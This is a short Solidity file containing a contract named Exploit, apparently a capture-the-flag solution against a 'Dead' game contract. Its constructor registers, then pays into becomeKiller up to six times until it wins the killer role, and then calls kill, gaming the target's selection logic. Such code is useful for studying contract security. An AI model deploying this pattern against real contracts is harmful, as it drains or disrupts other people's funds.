pragma solidity 0.8.11;

interface IDead {
    function register()  external payable;
    function canKill() external;
    function withdrawRegistration()  external;
    function becomeKiller() external payable;
    function changeKiller(address _newKiller) external;
    function kill() external;
    function killer() external returns (address);
}

contract Exploit {
    IDead dead;

    constructor(IDead _dead) payable {
        dead = _dead;
        require(msg.value >= 0.01 ether);
        dead.register{value: 0.01 ether}();
        dead.canKill();

        for (uint i; i < 6; ++i) {
            dead.becomeKiller{value: 0.09 ether}();
            if (dead.killer() == address(this)) {
                break;
            }
        }

        dead.kill();
    }
}
